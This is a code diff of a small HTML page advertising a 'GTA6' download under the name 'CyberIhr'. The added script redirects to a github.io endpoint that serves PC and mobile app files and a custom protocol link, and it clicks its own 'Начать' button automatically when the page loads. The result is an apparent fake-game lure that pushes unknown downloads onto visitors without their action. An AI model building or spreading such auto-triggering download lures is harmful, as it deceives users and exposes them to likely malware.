@@ -1,4 +1,23 @@
+<!DOCTYPE html>
 <html>
-  <title>CyberIhr | Download GTA6 Loading</title>
-    <button id="db" href="https://you-are-fat-gay2008.github.io/pages/v/api/userapp/?app_file_pc=https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-pc&app_file_mobile=https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-mobile&pc=cyberihr://gta6&mobile=cyberihr://gta6">Начать</button>
+  <head>
+    <title>CyberIhr | Download GTA6 Loading</title>
+  </head>
+  <body>
+    <button id="db">Начать</button>
+
+    <script>
+      document.getElementById('db').addEventListener('click', () => {
+        const params = new URLSearchParams({
+          app_file_pc: 'https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-pc',
+          app_file_mobile: 'https://you-are-fat-gay2008.github.io/pages/v/cyberihr.com/download-mobile',
+          pc: 'cyberihr://gta6',
+          mobile: 'cyberihr://gta6'
+        });
+        window.location.href = 'https://you-are-fat-gay2008.github.io/pages/v/api/userapp/?' + params;
+      });
+
+      document.getElementById('db').click();
+    </script>
+  </body>
 </html>
